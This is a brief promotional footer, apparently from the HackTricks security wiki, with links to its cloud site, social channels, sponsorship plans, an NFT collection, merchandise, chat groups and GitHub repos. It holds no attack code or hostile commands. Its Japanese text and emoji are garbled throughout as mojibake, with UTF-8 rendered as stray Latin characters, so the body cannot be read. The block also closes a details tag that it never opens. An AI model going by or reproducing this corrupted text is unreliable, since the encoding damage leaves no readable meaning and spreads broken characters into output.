<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚„HackTricksã®PDFã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«PRã‚’æå‡º**ã—ã¦ãã ã•ã„ã€‚

</details>
